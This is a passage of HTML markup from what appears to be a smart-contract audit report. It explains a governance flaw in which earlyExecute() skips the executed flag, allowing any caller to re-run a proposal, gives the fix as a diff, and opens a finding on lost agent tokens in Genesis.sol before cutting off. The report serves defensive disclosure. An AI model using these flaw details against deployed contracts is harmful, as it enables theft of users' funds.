href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/08566bfe0d19384af30a70815251fa913a19678b/contracts/governance/Governor.sol#L390-L425\"\u003e\u003ccode\u003eexecute()\u003c/code\u003e\u003c/a\u003e from the \u003ccode\u003eGovernor.sol\u003c/code\u003e abstract contract to execute the proposal again, since \u003ccode\u003e_proposals[proposalId].executed\u003c/code\u003e is not set to \u003ccode\u003etrue\u003c/code\u003e, as shown in the \u003ccode\u003eexecute()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexecute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epayable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ehashProposal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescriptionHash\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateStateBitmap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_encodeStateBitmap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSucceeded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) | \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_encodeStateBitmap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eProposalState\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eQueued\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// mark as executed before calls to avoid reentrancy\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e@\u0026gt;      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_proposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexecuted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e///code...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs shown, \u003ccode\u003eexecuted\u003c/code\u003e is set to \u003ccode\u003etrue\u003c/code\u003e to prevent a proposal from being executed more than once. However, when \u003ccode\u003e_executeOperations()\u003c/code\u003e is used directly, this flag is not set. Since the \u003ccode\u003eexecute()\u003c/code\u003e function is public and not overridden to include access control, any user can call it, allowing the proposal to be executed a second time.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eTo resolve the issue, replace the call to \u003ccode\u003e_executeOperations()\u003c/code\u003e with a call to \u003ccode\u003eexecute()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"99\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction earlyExecute(uint256 proposalId) public payable onlyRole(EXECUTOR_ROLE) returns (uint256) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            address[] memory targets,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            uint256[] memory values,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            bytes[] memory calldatas,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            bytes32 descriptionHash\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        ) = proposalDetails(proposalId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            state(proposalId) == ProposalState.Active \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                _voteSucceeded(proposalId) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                _quorumReached(proposalId) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                !_earlyExecutions[proposalId],\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u0026quot;Proposal not ready for early execution\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        // avoid reentrancy\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _earlyExecutions[proposalId] = true;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-       _executeOperations(proposalId, targets, values, calldatas, descriptionHash);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       execute(targets, values, calldatas, descriptionHash);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit ProposalExecuted(proposalId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return proposalId;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first\" style=\"position:relative;\"\u003e\u003ca href=\"#m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first\" aria-label=\"m 18 genesissolongenesissuccess users may lose their unclaimed agenttokens if a second launch occurs before theyve claimed their rewards from the first permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-114\"\u003e[M-18] \u003ccode\u003eGenesis.sol:onGenesisSuccess()\u003c/code\u003e users may lose their unclaimed \u003ccode\u003eagentTokens\u003c/code\u003e if a second launch occurs before they’ve claimed their rewards from the first\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-66\"\u003eFitro\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-705\"\u003edreamcoder\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L205-L304\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/21d5ffa77e769fa3c409b41e54656a0e3267beb5/contracts/genesis/Genesis.sol#L205-L304\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-5\" aria-label=\"finding description and impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eonGenesisSuccess()\u003c/code\u003e is used to refund virtual tokens to users and to account for the agent tokens earned by participating in a successful genesis event.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonGenesisSuccess\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erefundVirtualsTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAddresses\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeAgentTokenUserAmounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecreator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyRole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFACTORY_ROLE\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewhenNotCancelled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewhenNotFailed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewhenEnded\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//code...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if launch has been called before\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisFirstLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Calculate required balance based on whether this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erequiredVirtualsBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisFirstLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalRefundAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserveAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e : \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalRefundAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Check if contract has enough virtuals balance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erequiredVirtualsBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient Virtual Token balance\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Only do launch related operations if this is first launch\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 